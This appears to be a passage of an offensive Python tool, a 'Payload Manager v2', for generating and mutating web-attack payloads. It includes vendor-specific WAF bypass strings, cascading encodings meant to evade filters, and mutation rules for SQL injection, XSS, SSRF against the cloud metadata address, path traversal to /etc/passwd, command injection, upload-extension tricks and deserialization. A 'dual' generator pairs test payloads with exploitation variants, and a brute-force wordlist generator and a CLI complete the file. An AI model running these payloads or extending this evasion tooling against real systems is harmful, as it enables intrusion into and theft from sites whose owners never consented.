                'cloudflare': ['eval(String.fromCharCode(97,108,101,114,116,40,49,41))', '<ScRiPt>alert(1)</ScRiPt>', 'union/**/select'],
                'akamai': ['SLEEP(5)', 'benchmark(10000000,\'a\')', 'sleep/**/(5)', 'BENCHMARK(10000000,SHA1(\'a\'))'],
                'aws_waf': ['select%201,2,3', 'concat(0x7e,version())', 'select%0A1,2,3', 'con%00cat(1,2)'],
                'imperva': ['union%09select', '<scr%0ript>', 'SLEEP/**/(5)'],
                'f5_bigip': ['union%20select', 'or+1%3d1', 'sleep(5)%23'],
            }
        }

    def encode_payload(self, payload: str, technique: str = 'url') -> str:
        """Aplica técnica de encoding ao payload."""
        if technique == 'url':
            return urllib.parse.quote(payload)
        elif technique == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif technique == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif technique == 'hex':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif technique == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif technique == 'html_entity':
            return ''.join(f'&#{ord(c)};' if c.isalnum() else c for c in payload)
        elif technique == 'octal':
            return ''.join(f'\\{ord(c):03o}' for c in payload)
        elif technique == 'decimal':
            return ''.join(f'\\{ord(c)}' for c in payload)
        return payload

    def cascade_encode(self, payload: str, chain: List[str]) -> str:
        """Aplica encoding em cascata: url -> hex -> url, etc."""
        result = payload
        for tech in chain:
            result = self.encode_payload(result, tech)
        return result

    def mix_case(self, payload: str) -> str:
        """Alterna maiúsculas e minúsculas para bypass."""
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def random_case(self, payload: str) -> str:
        """Random case mixing."""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    def add_null_byte(self, payload: str, position: int = -1) -> str:
        """Insere null byte no payload."""
        if position == -1:
            position = len(payload) // 2
        return payload[:position] + '\x00' + payload[position:]

    def replace_chars(self, payload: str) -> List[str]:
        """Substitui espaços por outros caracteres."""
        return [
            payload.replace(' ', '%09'),
            payload.replace(' ', '%0a'),
            payload.replace(' ', '%0d'),
            payload.replace(' ', '+'),
            payload.replace(' ', '%20'),
        ]

    def bypass_waf(self, payload: str, waf_type: str = 'generic') -> List[str]:
        """Gera variantes de bypass para um WAF específico."""
        variants = {payload}  # use set for dedup

        # Single encoding techniques
        for enc in self.bypass_techniques['encoding']:
            variants.add(self.encode_payload(payload, enc))

        # Case mixing
        variants.add(self.mix_case(payload))
        variants.add(self.random_case(payload))

        # Null byte
        variants.add(self.add_null_byte(payload))

        # Char replacement
        for variant in self.replace_chars(payload):
            variants.add(variant)

        # Cascading multi-encoding (NEW v2)
        cascades = [
            ['url', 'hex', 'url'],
            ['hex', 'base64', 'hex'],
            ['url', 'base64', 'url'],
            ['double_url', 'hex'],
            ['hex', 'url', 'hex'],
            ['url', 'unicode', 'url'],
        ]
        for cascade in cascades:
            variants.add(self.cascade_encode(payload, cascade))

        # WAF-specific
        if waf_type in self.bypass_techniques['waf_specific']:
            for v in self.bypass_techniques['waf_specific'][waf_type]:
                variants.add(v)

        return list(variants)

    def detect_waf(self, payload: str) -> List[str]:
        """Detecta qual WAF o payload pode disparar."""
        triggered = []
        for waf, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if re.search(sig, payload, re.IGNORECASE):
                    triggered.append(waf)
                    break
        return triggered


# =========================================================================
# AI-Simulated Mutation Engine
# =========================================================================

class MutationEngine:
    """Gera mutações context-aware com simulação de IA heurística."""

    MUTATION_RULES = {
        'sqli': [
            lambda p: p.replace("'", "`"),
            lambda p: p.replace("'", "%27"),
            lambda p: p + " /* comment */",
            lambda p: p.replace(" OR ", " || "),
            lambda p: p.replace("AND", "&&").replace("OR", "||"),
            lambda p: p.replace("UNION", "UnIoN"),
            lambda p: p.replace("SELECT", "SeLeCt"),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace(" ", "%0A"),
            lambda p: p.replace(" ", "+"),
            lambda p: p.replace("admin", "AdMiN"),
            lambda p: p.replace("password", "PaSsWoRd"),
        ],
        'xss': [
            lambda p: p.replace('<', '%3C').replace('>', '%3E'),
            lambda p: p.replace('script', 'scr' + 'ipt'),
            lambda p: p.replace('alert', 'ale' + 'rt'),
            lambda p: p.replace('(', '%28').replace(')', '%29'),
            lambda p: p.replace('onerror', 'onErroR'),
            lambda p: p.replace('javascript:', 'java\\x00script:'),
            lambda p: p.replace('src=', 'src =' ),
            lambda p: p.replace('<img', '<img%20'),
            lambda p: p.replace('</', '<%00/'),
            lambda p: p.replace('src="', 'src=\x27'),
        ],
        'ssrf': [
            lambda p: p.replace('127.0.0.1', 'localhost'),
            lambda p: p.replace('127.0.0.1', '0x7f000001'),
            lambda p: p.replace('169.254.169.254', '4294967294'),
            lambda p: p.replace('http://', 'hTTp://'),
            lambda p: p.replace('169.254.169.254', '0xA9FEA9FE'),
            lambda p: p.replace('://', '://%00/'),
            lambda p: p.replace('@', '%40'),
        ],
        'lfi': [
            lambda p: p.replace('/', '\\\\'),
            lambda p: p.replace('..', '.%2e').replace('.%2e', '..%252e'),
            lambda p: p.replace('/etc/passwd', '/etc%2fpasswd'),
            lambda p: p.replace('..%2f', '..%252f'),
            lambda p: p.replace('%2e', '%252e'),
            lambda p: p.replace('/', '%2f'),
        ],
        'rce': [
            lambda p: p.replace('|', ' | '),
            lambda p: p.replace('&&', ' && '),
            lambda p: p.replace(';', ';\\n'),
            lambda p: p.replace('$(', '${@assert}('),
            lambda p: p.replace(';', ' ; '),
        ],
        'auth': [
            lambda p: p.replace('admin', 'Admin').replace('ADMIN', 'aDmin'),
            lambda p: p.replace("'", '`'),
            lambda p: p + ' --',
            lambda p: p.replace("OR", "or").replace("or", "OR"),
            lambda p: p.replace("'", "%27"),
        ],
        'upload': [
            lambda p: p.replace('.php', '.pHp').replace('.PHP', '.phP'),
            lambda p: p.replace('.asp', '.Asp').replace('.ASP', '.asp'),
            lambda p: p.replace('.jsp', '.Jsp').replace('.JSP', '.jsp'),
            lambda p: p.replace('.php', '.php5'),
            lambda p: p.replace('.php', '.phtml'),
            lambda p: p.replace('.php', '.php3'),
        ],
        'deser': [
            lambda p: p.replace('rO0', 'ro0').replace('RO0', 'rO0'),
            lambda p: p.replace('cos\\n', 'COS\\n').replace('COS\\n', 'cos\\n'),
            lambda p: p.replace('O:', 'o:'),
        ],
        'csrf': [
            lambda p: p.replace('GET', 'get').replace('POST', 'post'),
            lambda p: p.replace('Cookie:', 'cookie:'),
        ],
        'oauth': [
            lambda p: p.replace('code', 'Code').replace('CODE', 'code'),
            lambda p: p.replace('redirect_uri', 'Redirect_URI'),
        ],
        'token': [
            lambda p: p.replace('Bearer', 'BEARER').replace('bearer', 'Bearer'),
            lambda p: p.replace('Authorization:', 'authorization:'),
        ],
        'ldap': [
            lambda p: p.replace('*)(|(', '*) (*|('),
            lambda p: p.replace('*', '\\0x2a'),
        ],
        'xpath': [
            lambda p: p.replace("'", '\\&\\apos;'),
            lambda p: p.replace('or', 'oR').replace('OR', 'Or'),
        ],
        'xxe': [
            lambda p: p.replace('<!', '&lt;!'),
            lambda p: p.replace('SYSTEM', 'SyStEm'),
        ],
        'sse': [
            lambda p: p.replace('data:', 'Data:').replace('event:', 'Event:'),
        ],
        'webhook': [
            lambda p: p.replace('http://', 'HTTP://').replace('https://', 'HTTPS://'),
        ],
        'race': [
            lambda p: p.replace('Concurrent', 'concurrent').replace('CONCURRENT', 'Concurrent'),
        ],
        'http_smuggling': [
            lambda p: p.replace('Content-Length', 'content-length'),
            lambda p: p.replace('Transfer-Encoding', 'transfer-encoding'),
        ],
        'prototype_pollution': [
            lambda p: p.replace('__proto__', '__Proto__'),
        ],
        'csp': [
            lambda p: p.replace('script-src', 'Script-Src').replace('default-src', 'Default-Src'),
        ],
        'subdomain_takeover': [
            lambda p: p.replace('cname-challenge', 'CNAME-challenge'),
        ],
        'graphql': [
            lambda p: p.replace('{', '{\\n').replace('}', '\\n}'),
        ],
        'redirect': [
            lambda p: p.replace('//', '/\\/').replace('http://', 'ht%74p://'),
        ],
    }

    def mutate(self, payload: str, category: str) -> List[str]:
        """Gera mutações baseadas na categoria com heurística simulada."""
        variants = {payload}
        rules = self.MUTATION_RULES.get(category, [])
        for rule in rules:
            try:
                mutated = rule(payload)
                if mutated != payload:
                    variants.add(mutated)
            except Exception:
                pass
        return list(variants)

    def intelligent_mutate(self, payload: str, category: str, context: Optional[Dict] = None) -> List[str]:
        """Mutación inteligente com priorização baseada em contexto."""
        # Base mutations
        variants = self.mutate(payload, category)

        # Context-aware overrides
        if context:
            waf_types = context.get('waf_types', [])
            if waf_types:
                # If WAF is known, prioritize encoding variants
                encoding_variants = []
                for waf in waf_types:
                    enc = WAFBypassEngine()
                    encoding_variants.extend(enc.bypass_waf(payload, waf))
                variants.extend(encoding_variants)

            target_lang = context.get('target_language', '')
            if 'php' in target_lang.lower():
                variants.append(payload.replace('id', 'i\'d'))
                variants.append(f"<?php {payload} ?>")

        # Deduplicate
        return list(dict.fromkeys(variants))  # preserves order, removes dups


# =========================================================================
# Dual Payload Generator (bypass duplo)
# =========================================================================

class DualPayloadGenerator:
    """Gera pares de payloads que se complementam para bypass duplo."""

    @staticmethod
    def generate_sqli_dual(base: str) -> List[Tuple[str, str]]:
        """Gera par payload duplo para SQLi — um para teste, outro para exploração."""
        return [
            (base, base.replace("'", "`")),
            (base, base + " -- "),
            (base, base.replace("UNION", "UnIoN")),
            (base, f"({base})"),
        ]

    @staticmethod
    def generate_xss_dual(base: str) -> List[Tuple[str, str]]:
        """Gera par payload duplo para XSS — contexto HTML + JS."""
        return [
            (base, base.replace('<script>', '<ScrIpT>')),
            (base, f'<img src=x onerror="{base}">'),
            (base, base.replace('alert', 'String.fromCharCode')),
            (base, f'<div style="background:url(javascript:{base})">'),
        ]

    @staticmethod
    def generate_ssrf_dual(base: str) -> List[Tuple[str, str]]:
        """Gera par payload duplo para SSRF — URL direta + gopher."""
        return [
            (base, base.replace('http://', 'gopher://')),
            (base, base.replace('127.0.0.1', 'localhost')),
            (base, f'file://{base.replace("http://", "")}'),
        ]

    DUAL_GENERATORS = {
        'sqli': generate_sqli_dual,
        'xss': generate_xss_dual,
        'ssrf': generate_ssrf_dual,
    }

    @classmethod
    def generate(cls, payload: str, category: str) -> List[Tuple[str, str]]:
        gen = cls.DUAL_GENERATORS.get(category)
        if gen:
            return gen(payload)
        return [(payload, payload)]


# =========================================================================
# Payload Manager v2 — Classe Principal
# =========================================================================

class PayloadManager:
    """Gerenciador completo de payloads v2 com 50+ categorias."""

    def __init__(self, storage_path: Optional[Path] = None):
        self.categories = PAYLOAD_CATEGORIES
        self.waf_engine = WAFBypassEngine()
        self.mutation_engine = MutationEngine()
        self.dual_gen = DualPayloadGenerator()
        self.custom_storage = storage_path or (Path.home() / '.payload-manager' / 'custom.json')
        self.custom_storage.parent.mkdir(parents=True, exist_ok=True)
        self._load_custom()
        logger.info("Payload Manager v2 initialized")

    def _load_custom(self):
        if self.custom_storage.exists():
            try:
                with open(self.custom_storage, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for cat, subs in data.items():
                        for sub, payloads in subs.items():
                            key = f"{cat}_{sub}"
                            if key not in self.categories:
                                self.categories[key] = {
                                    'category': cat,
                                    'subcat': sub,
                                    'description': f'Custom: {sub}',
                                    'payloads': payloads
                                }
                logger.info(f"Loaded {len(data)} custom categories")
            except Exception as e:
                logger.error(f"Failed to load custom payloads: {e}")

    def _save_custom(self):
        custom = {}
        builtin_prefixes = tuple(c + '_' for c in [
            'sqli', 'xss', 'lfi', 'ssrf', 'rce', 'auth', 'upload',
            'ldap', 'xpath', 'xxe', 'jwt', 'deser', 'redirect',
            'injection', 'header', 'csrf', 'mass', 'idor', 'webhook',
            'sse', 'oauth', 'token', 'open', 'subdomain', 'csp', 'race',
            'http_', 'prototype', 'graphql'
        ])
        for key, data in self.categories.items():
            if not key.startswith(builtin_prefixes):
                cat = data.get('category', 'unknown')
                sub = data.get('subcat', 'unknown')
                if cat not in custom:
                    custom[cat] = {}
                custom[cat][sub] = data['payloads']
        with open(self.custom_storage, 'w', encoding='utf-8') as f:
            json.dump(custom, f, indent=2)

    def list_categories(self) -> List[str]:
        cats = set()
        for data in self.categories.values():
            cats.add(data.get('category', 'unknown'))
        return sorted(cats)

    def list_subcategories(self, category: str) -> List[str]:
        subs = set()
        for key, data in self.categories.items():
            if data.get('category') == category:
                subs.add(data.get('subcat', 'unknown'))
        return sorted(subs)

    def get_payloads(self, category: str, subcat: Optional[str] = None) -> List[Dict]:
        results = []
        for key, data in self.categories.items():
            if data.get('category') == category:
                if subcat is None or data.get('subcat') == subcat:
                    results.append({
                        'key': key,
                        'category': data.get('category'),
                        'subcat': data.get('subcat'),
                        'description': data.get('description', ''),
                        'payloads': data['payloads'] if isinstance(data['payloads'], list) else [data['payloads']]
                    })
        return results

    def get_single(self, category: str, subcat: str) -> Optional[Dict]:
        key = f"{category}_{subcat}"
        if key in self.categories:
            data = self.categories[key]
            return {
                'key': key,
                'category': data.get('category'),
                'subcat': data.get('subcat'),
                'description': data.get('description', ''),
                'payloads': data['payloads'] if isinstance(data['payloads'], list) else [data['payloads']]
            }
        return None

    def encode_payload(self, payload: str, technique: str = 'url') -> str:
        return self.waf_engine.encode_payload(payload, technique)

    def encode_all(self, payloads: List[str], technique: str = 'url') -> List[str]:
        return [self.encode_payload(p, technique) for p in payloads]

    def waf_bypass(self, payload: str, waf_type: str = 'generic') -> List[str]:
        return self.waf_engine.bypass_waf(payload, waf_type)

    def cascade_bypass(self, payload: str, chain: List[str]) -> str:
        """Cascading multi-encoding bypass."""
        return self.waf_engine.cascade_encode(payload, chain)

    def detect_waf_triggers(self, payload: str) -> List[str]:
        return self.waf_engine.detect_waf(payload)

    def mutate_payload(self, payload: str, category: str) -> List[str]:
        return self.mutation_engine.mutate(payload, category)

    def intelligent_mutate(self, payload: str, category: str, context: Optional[Dict] = None) -> List[str]:
        """AI-simulated intelligent mutation with context awareness."""
        return self.mutation_engine.intelligent_mutate(payload, category, context)

    def generate_dual_payloads(self, payload: str, category: str) -> List[Tuple[str, str]]:
        return self.dual_gen.generate(payload, category)

    def store_payload(self, category: str, subcat: str, payload: str, description: str = ""):
        key = f"{category}_{subcat}"
        self.categories[key] = {
            'category': category,
            'subcat': subcat,
            'description': description or f'Custom: {subcat}',
            'payloads': [payload] if not isinstance(payload, list) else payload
        }
        self._save_custom()
        logger.info(f"Stored custom payload: {key}")

    def export_payloads(self, category: str, subcat: Optional[str] = None, format: str = 'text') -> str:
        results = self.get_payloads(category, subcat)
        if format == 'json':
            return json.dumps(results, indent=2)
        lines = []
        for r in results:
            lines.append(f"=== {r['category']}/{r['subcat']} ===")
            if r['description']:
                lines.append(f"# {r['description']}")
            for p in r['payloads']:
                lines.append(str(p))
            lines.append("")
        return '\n'.join(lines)

    def generate_wordlist(self, min_len: int = 3, max_len: int = 6) -> List[str]:
        chars = string.ascii_lowercase + string.digits
        words = []
        for length in range(min_len, max_len + 1):
            for combo in itertools.product(chars, repeat=length):
                words.append(''.join(combo))
        return words

    def search_payloads(self, keyword: str, category: Optional[str] = None) -> List[Dict]:
        """Busca payloads por keyword em todas as categorias."""
        results = []
        kw_lower = keyword.lower()
        for key, data in self.categories.items():
            if category and data.get('category') != category:
                continue
            desc = data.get('description', '').lower()
            payloads = data.get('payloads', [])
            if isinstance(payloads, str):
                payloads = [payloads]
            for p in payloads:
                p_str = str(p).lower()
                if kw_lower in desc or kw_lower in p_str:
                    results.append({
                        'key': key,
                        'category': data.get('category'),
                        'subcat': data.get('subcat'),
                        'description': data.get('description', ''),
                        'payload': p,
                    })
                    break  # one match per category key is enough
        return results

    def get_stats(self) -> Dict:
        total = 0
        by_category = defaultdict(int)
        for data in self.categories.values():
            count = len(data['payloads']) if isinstance(data['payloads'], list) else 1
            total += count
            by_category[data.get('category', 'unknown')] += count
        return {
            'total_categories': len(self.categories),
            'total_payloads': total,
            'by_category': dict(by_category),
            'waf_techniques': len(self.waf_engine.bypass_techniques['encoding']),
            'cascade_combinations': 6,
            'mutation_rules': sum(len(v) for v in self.mutation_engine.MUTATION_RULES.values()),
        }

    def get_all_payloads_flat(self) -> List[Dict]:
        flat = []
        for key, data in self.categories.items():
            payloads = data['payloads'] if isinstance(data['payloads'], list) else [data['payloads']]
            for p in payloads:
                flat.append({
                    'key': key,
                    'category': data.get('category'),
                    'subcat': data.get('subcat'),
                    'payload': p if isinstance(p, str) else p.get('payload', str(p))
                })
        return flat


# =========================================================================
# CLI Interface
# =========================================================================

def main():
    import argparse
    import json
    parser = argparse.ArgumentParser(
        description='Payload Manager v2 -- 146+ categorias, WAF bypass cascata, mutacao IA, duplos'
    )
    parser.add_argument('--list-categories', action='store_true', help='Lista categorias')
    parser.add_argument('--list', metavar='CAT', help='Lista payloads de uma categoria')
    parser.add_argument('--get', nargs=2, metavar=('CAT', 'SUBCAT'), help='Get payload especifico')
    parser.add_argument('--encode', nargs=2, metavar=('TECHNIQUE', 'PAYLOAD'), help='Codifica payload')
    parser.add_argument('--cascade', nargs='+', metavar=('TECH1', 'TECH2', 'PAYLOAD'), help='Cascata de encodings')
    parser.add_argument('--waf-bypass', nargs='+', metavar=('PAYLOAD', 'WAF_TYPE'), help='WAF bypass')
    parser.add_argument('--mutate', nargs=2, metavar=('PAYLOAD', 'CATEGORY'), help='Mutates payload')
    parser.add_argument('--intelligent-mutate', nargs='+', metavar=('PAYLOAD', 'CATEGORY'), help='AI-simulated mutation')
    parser.add_argument('--dual', nargs=2, metavar=('PAYLOAD', 'CATEGORY'), help='Gera pares de payloads')
    parser.add_argument('--detect-waf', metavar='PAYLOAD', help='Detecta WAF triggers')
    parser.add_argument('--store', nargs=3, metavar=('CAT', 'SUBCAT', 'PAYLOAD'), help='Armazena custom')
    parser.add_argument('--export', nargs=1, metavar='CAT', help='Exporta categoria')
    parser.add_argument('--generate', nargs=2, metavar=('MIN', 'MAX'), type=int, help='Gera wordlist')
    parser.add_argument('--stats', action='store_true', help='Estatisticas')
    parser.add_argument('--search', '-S', metavar='KEYWORD', help='Busca payloads por keyword')
    parser.add_argument('--search-cat', metavar='CAT', help='Filtrar busca por categoria')
    args = parser.parse_args()

    mgr = PayloadManager()

    if args.list_categories:
        for cat in mgr.list_categories():
            subs = mgr.list_subcategories(cat)
            print(f"\n[{cat}] ({len(subs)} subcategorias)")
            for sub in subs:
                data = mgr.get_single(cat, sub)
                if data:
                    print(f"  - {sub}: {len(data['payloads'])} payloads")

    elif args.list:
        results = mgr.get_payloads(args.list)
        for r in results:
            print(f"\n=== {r['category']}/{r['subcat']} ===")
            if r['description']:
                print(f"# {r['description']}")
            for p in r['payloads']:
                print(f"  {p}")

    elif args.get:
        data = mgr.get_single(args.get[0], args.get[1])
        if data:
            print(f"[{data['category']}/{data['subcat']}]")
            if data['description']:
                print(f"# {data['description']}")
            for p in data['payloads']:
                print(p)
        else:
            print(f"Not found: {args.get[0]}/{args.get[1]}")

    elif args.encode:
        encoded = mgr.encode_payload(args.encode[1], args.encode[0])
        print(encoded)

    elif args.cascade:
        chain = args.cascade[:-1]
        payload = args.cascade[-1]
        encoded = mgr.cascade_bypass(payload, chain)
        print(f"Chain: {' -> '.join(chain)}")
        print(f"Result: {encoded}")

    elif args.waf_bypass:
        payload = args.waf_bypass[0]
        waf_type = args.waf_bypass[1] if len(args.waf_bypass) > 1 else 'generic'
        bypasses = mgr.waf_bypass(payload, waf_type)
        for b in bypasses:
            print(b)

    elif args.mutate:
        mutations = mgr.mutate_payload(args.mutate[0], args.mutate[1])
        for m in mutations:
            print(m)

    elif args.intelligent_mutate:
        payload = args.intelligent_mutate[0]
        category = args.intelligent_mutate[1]
        mutations = mgr.intelligent_mutate(payload, category)
        print(f"Intelligent mutations for {category} ({len(mutations)} variants):")
        for m in mutations:
            print(f"  {m}")

    elif args.dual:
        pairs = mgr.generate_dual_payloads(args.dual[0], args.dual[1])
        for i, (p1, p2) in enumerate(pairs, 1):
            print(f"  Pair {i}:")
            print(f"    A: {p1}")
            print(f"    B: {p2}")

    elif args.detect_waf:
        triggers = mgr.detect_waf_triggers(args.detect_waf)
        if triggers:
            print(f"WAF triggers detected: {', '.join(triggers)}")
        else:
            print("No WAF triggers detected")

    elif args.store:
        mgr.store_payload(args.store[0], args.store[1], args.store[2])
        print(f"Stored: {args.store[0]}/{args.store[1]}")

    elif args.export:
        print(mgr.export_payloads(args.export[0]))

    elif args.generate:
        words = mgr.generate_wordlist(args.generate[0], args.generate[1])
        print(f"Generated {len(words)} words")
        for w in words[:20]:
            print(w)
        if len(words) > 20:
            print(f"... and {len(words)-20} more")

    elif args.search:
        results = mgr.search_payloads(args.search, args.search_cat)
        if results:
            print(f"Found {len(results)} matching payload(s):")
            for r in results:
                print(f"  [{r['category']}/{r['subcat']}] {r['payload']}")
        else:
            print(f"No payloads found matching '{args.search}'")

    elif args.stats:
        stats = mgr.get_stats()
        print(json.dumps(stats, indent=2))

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
